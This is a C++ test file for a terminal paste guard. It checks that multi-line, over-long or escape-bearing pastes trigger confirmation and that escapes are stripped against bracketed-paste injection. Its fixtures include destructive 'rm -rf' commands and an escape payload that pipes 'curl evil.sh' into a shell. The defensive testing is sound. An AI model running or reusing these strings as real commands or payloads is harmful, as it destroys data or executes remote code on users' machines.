// PasteGuardTests.cpp — when a paste has to be confirmed. This is a safety
// rule, so the boundaries are pinned rather than left to the UI.
#include <catch2/catch_test_macros.hpp>

#include <string>

#include "utility/PasteGuard.h"

using amber::kPasteConfirmChars;
using amber::PasteLineCount;
using amber::PasteNeedsConfirm;

TEST_CASE("a single line pastes without interruption", "[paste][safety]")
{
    REQUIRE_FALSE(PasteNeedsConfirm("ls -la", true));
    REQUIRE_FALSE(PasteNeedsConfirm("", true));
    REQUIRE_FALSE(PasteNeedsConfirm(std::string(500, 'x'), true));
}

TEST_CASE("anything that would submit a command is confirmed",
          "[paste][safety]")
{
    // One carriage return is one Enter: this already runs the first command.
    REQUIRE(PasteNeedsConfirm("rm -rf /var/tmp\r", true));
    REQUIRE(PasteNeedsConfirm("a\rb", true));
    REQUIRE(PasteNeedsConfirm("\r", true));
}

TEST_CASE("a very long single line is confirmed too", "[paste][safety]")
{
    REQUIRE_FALSE(PasteNeedsConfirm(std::string(kPasteConfirmChars, 'x'), true));
    REQUIRE(PasteNeedsConfirm(std::string(kPasteConfirmChars + 1, 'x'), true));
}

TEST_CASE("the guard can be switched off", "[paste][safety]")
{
    REQUIRE_FALSE(PasteNeedsConfirm("rm -rf /\rreboot\r", false));
    REQUIRE_FALSE(PasteNeedsConfirm(std::string(9999, 'x'), false));
}

TEST_CASE("the reported line count matches what would be submitted",
          "[paste]")
{
    REQUIRE(PasteLineCount("one") == 1);
    REQUIRE(PasteLineCount("one\rtwo") == 2);
    // A trailing return means the last line is submitted as well, so it is a
    // line for the purposes of the warning.
    REQUIRE(PasteLineCount("one\rtwo\r") == 3);
    REQUIRE(PasteLineCount("") == 1);
}

// ---- escape stripping ------------------------------------------------------
// A paste is wrapped in "\e[200~ ... \e[201~" when the shell has bracketed
// paste on. An ESC inside the payload closes that bracket early and the rest
// arrives as typed input, so the payload is stripped of escapes before it is
// wrapped.
TEST_CASE("pasted escapes are removed", "[pasteguard]")
{
    using amber::PasteWithoutEscapes;
    using amber::PasteHasEscapes;

    REQUIRE(PasteWithoutEscapes("ls -la") == "ls -la");
    REQUIRE_FALSE(PasteHasEscapes("ls -la"));

    // The attack: close the bracket, then a command. No line break, well
    // under the length limit, so the confirm predicate alone would miss it.
    const std::string attack = "\x1b[201~curl evil.sh|sh";
    REQUIRE(PasteHasEscapes(attack));
    REQUIRE(PasteWithoutEscapes(attack) == "[201~curl evil.sh|sh");
    REQUIRE(PasteWithoutEscapes(attack).find('\x1b') == std::string::npos);

    // Tabs and other ordinary C0 characters are left alone: they are things
    // people paste on purpose.
    REQUIRE(PasteWithoutEscapes("a\tb\rc") == "a\tb\rc");
}

TEST_CASE("an escape alone is enough to ask", "[pasteguard]")
{
    // Previously only a carriage return or 2000 characters would confirm.
    REQUIRE(amber::PasteNeedsConfirm("\x1b[201~id", true));
    REQUIRE_FALSE(amber::PasteNeedsConfirm("\x1b[201~id", false));   // guard off is guard off
    REQUIRE_FALSE(amber::PasteNeedsConfirm("plain text", true));
}
